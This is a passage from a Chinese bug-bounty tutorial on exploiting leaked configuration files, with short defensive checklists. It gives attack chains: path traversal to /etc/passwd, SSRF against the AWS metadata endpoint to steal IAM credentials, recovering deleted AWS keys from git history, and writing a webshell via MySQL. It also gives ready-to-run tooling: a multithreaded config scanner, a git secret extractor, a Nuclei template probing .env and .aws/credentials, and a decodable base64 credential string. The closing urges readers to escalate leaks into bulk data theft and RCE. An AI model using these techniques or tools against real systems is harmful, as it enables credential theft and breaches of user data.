：配置AWS CLI，aws sts get-caller-identity  
返回有效  
  
1. **资产枚举**  
：aws s3 ls  
发现3个生产bucket  
  
1. **数据下载**  
：其中一个bucket包含database-backup.sql  
，内含10万+用户数据  
  
1. **报告提交**  
：完整攻击链+证据截图，获高危评级  
  
### 【案例2】Git历史记录中的“时光漏洞”  
  
**目标**  
：某金融科技公司**耗时**  
：2小时**奖金**  
：8,000元  
  
**攻击路径**  
：  
1. **资产发现**  
：test.target.com/.git/HEAD  
返回200  
  
1. **下载仓库**  
：使用git-dumper下载完整.git目录  
  
1. **历史分析**  
：git log -p | grep -i aws  
发现半年前的一次提交删除了AWS密钥  
  
1. **恢复文件**  
：git checkout <commit-hash> -- config/aws.yml  
，获取AccessKey  
  
1. **凭证测试**  
：配置AWS CLI，发现可访问prod-bucket  
  
1. **数据发现**  
：bucket内含用户身份证照片、营业执照  
  
1. **报告提交**  
：厂商紧急修复，授予特别奖励  
  
### 【案例3】从文件读取到MongoDB的“五层突破”  
  
**目标**  
：印度某电商巨头**耗时**  
：未知**奖金**  
：严重级别（未披露）  
  
**攻击路径**  
：  
1. **入口**  
：发现文件下载功能，测试../../../../etc/passwd  
成功  
  
1. **系统识别**  
：读取/etc/motd  
，确认运行在AWS ElasticBeanstalk  
  
1. **元数据访问**  
：通过SSRF尝试http://169.254.169.254/latest/meta-data/  
成功  
  
1. **凭证获取**  
：访问/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role  
，获取临时AWS凭证  
  
1. **S3枚举**  
：配置aws-cli，列出S3 bucket  
  
1. **配置发现**  
：在bucket中找到database.js  
、config.js  
、payment.config  
，内含MongoDB凭证、支付Hash key  
  
1. **数据库连接**  
：用凭证连接MongoDB，发现10万+客户数据  
  
1. **报告提交**  
：完整攻击链，厂商紧急修复所有凭证  
  
### 【案例4】Laravel Debug模式泄露数据库  
  
**目标**  
：某政务系统**耗时**  
：30分钟**奖金**  
：5,000元  
  
**攻击路径**  
：  
1. **框架识别**  
：访问任意页面，返回头包含Laravel  
标识  
  
1. **debug测试**  
：访问/admin  
（需登录），拦截请求，将GET改为PUT  
  
1. **触发报错**  
：返回500错误，页面中包含MySQL连接信息  
  
1. **凭证获取**  
：DB_PASSWORD=root123  
，DB_HOST=127.0.0.1  
  
1. **端口探测**  
：尝试连接3306，发现不能外连  
  
1. **本地利用**  
：若不能外连，尝试写Webshell（需secure_file_priv允许）  
  
1. **报告提交**  
：泄露的数据库凭证可导致数据泄露  
  
### 【案例5】GitHub Actions Runner中的硬编码凭证  
  
**目标**  
：GitHub（通过Bug Bounty）**耗时**  
：研究性质**奖金**  
：未披露（已知问题）  
  
**攻击路径**  
：  
1. **环境探测**  
：在GitHub Action中运行cat ~/.docker/config.json  
  
1. **凭证提取**  
：发现base64编码的Docker Hub凭证  
  
1. **解码测试**  
：echo 'Z2l0aHViYWN0aW9uczpldWxrZ2ozenVpc2RqaW92bmJzeGdoY2FjdG9y' | base64 -d  
，获取用户名密码  
  
1. **权限验证**  
：用凭证登录Docker Hub，可拉取镜像  
  
1. **影响评估**  
：可耗尽Docker Hub rate limit，导致GitHub Actions服务中断  
  
1. **报告提交**  
：GitHub确认已知问题，计划未来加固  
  
## 第六章 自动化武器库  
### 6.1 配置文件批量扫描器  
```
# config_scanner.py
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

class ConfigScanner:
    def __init__(self, base_url, wordlist):
        self.base_url = base_url.rstrip('/')
        self.wordlist = wordlist
        self.results = []

    def check_path(self, path):
        url = f"{self.base_url}/{path}"
        try:
            r = requests.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200:
                # 检测配置文件特征
                if self.is_config_file(r.text):
                    print(f"[+] 发现配置文件: {url}")
                    print(f"    响应前100字符: {r.text[:100]}")
                    self.results.append({"url": url, "content": r.text[:500]})
        except:
            pass

    def is_config_file(self, content):
        """检测是否为配置文件"""
        indicators = [
            "DB_", "database", "password", "secret", "key", 
            "AWS", "ACCESS_KEY", "mysql://", "postgres://",
            "<?php", "[database]", "driver", "username"
        ]
        content_lower = content.lower()
        for ind in indicators:
            if ind.lower() in content_lower:
                return True
        return False

    def scan(self, threads=50):
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.check_path, self.wordlist)

# 使用示例
wordlist = [".env", "config.php", "wp-config.php", "application.properties"]
scanner = ConfigScanner("https://target.com", wordlist)
scanner.scan()
```  
### 6.2 Git历史敏感信息提取器  
```
# git_secret_extractor.py
import os
import re
import subprocess

def extract_git_secrets(repo_path):
    """从git历史中提取敏感信息"""
    os.chdir(repo_path)

    # 获取所有提交的diff
    result = subprocess.run(
        ['git', 'log', '-p'],
        capture_output=True,
        text=True
    )

    log = result.stdout

    # 敏感信息正则
    patterns = {
        'aws_key': r'(AKIA[0-9A-Z]{16})',
        'password': r'(?i)(password|pwd|pass)[\s]*[:=][\s]*[\'"]?([^\'"\s]+)',
        'api_key': r'(?i)(api[_-]?key|apikey|secret)[\s]*[:=][\s]*[\'"]?([^\'"\s]+)',
        'token': r'[a-zA-Z0-9\-_]{20,}',
    }

    findings = []
    for name, pattern in patterns.items():
        matches = re.findall(pattern, log)
        if matches:
            findings.append({name: matches[:10]})  # 取前10个

    return findings
```  
### 6.3 Nuclei配置泄露检测模板  
```
id: config-file-disclosure

info:
  name: Config File Disclosure
  author: hunter
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/config.php"
      - "{{BaseURL}}/wp-config.php"
      - "{{BaseURL}}/application.properties"
      - "{{BaseURL}}/.aws/credentials"
      - "{{BaseURL}}/.git/config"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "DB_PASSWORD"
          - "database_password"
          - "AWS_ACCESS_KEY"
          - "[database]"
        part: body

      - type: regex
        regex:
          - "AKIA[0-9A-Z]{16}"
          - "password\\s*=\\s*['\"][^'\"]+"
```  
## 第七章 防御视角：为什么你的配置总在泄露  
### 7.1 开发者最常见的7个错误  
1. **将配置文件放在Web根目录**  
：.env  
直接可访问  
  
1. **忘记删除备份文件**  
：config.php.bak  
、config.php~  
留在服务器  
  
1. **Git提交包含敏感信息**  
：即使删除，历史记录还在  
  
1. **调试模式开启**  
：错误页面泄露数据库密码  
  
1. **云凭证硬编码**  
：在代码中写死AccessKey  
  
1. **文件上传不做隔离**  
：允许上传.env  
等敏感文件名  
  
1. **目录列表开启**  
：直接暴露整个目录结构  
  
### 7.2 企业自查清单  
- 所有配置文件是否放在Web根目录之外？  
  
- 是否禁用目录列表？  
  
- 生产环境是否关闭debug模式？  
  
- 是否定期扫描公开暴露的配置文件？  
  
- Git历史中是否包含敏感信息？（用git filter-branch  
清理）  
  
- 云凭证是否使用临时令牌而非永久密钥？  
  
- 敏感文件访问是否有日志和告警？  
  
## 第八章 结语：配置泄露的尽头是什么  
  
一个.env  
文件，可能让你拿到数据库密码。  
一个~/.aws/credentials  
，可能让你接管整个云环境。  
一个application.properties  
，可能让你逆向出0day。  
一个/proc/self/environ  
，可能让你发现环境变量中的密钥。  
  
**配置泄露不是低端漏洞，它是通往核心资产的传送门。**  
 一次成功的配置获取，等于拿到了整个系统的**钥匙串**  
——剩下的只是试哪一把能开门的问题。  
  
我见过太多人发现.env  
后只提交“敏感信息泄露”，拿个500元就走。但他们不知道，那个文件里的AWS密钥可以值8000，那个数据库密码可以拖出10万条数据，那个APP_KEY可以配合反序列化打成RCE。  
  
**下次你遇到配置文件，别急着提交。**  
  
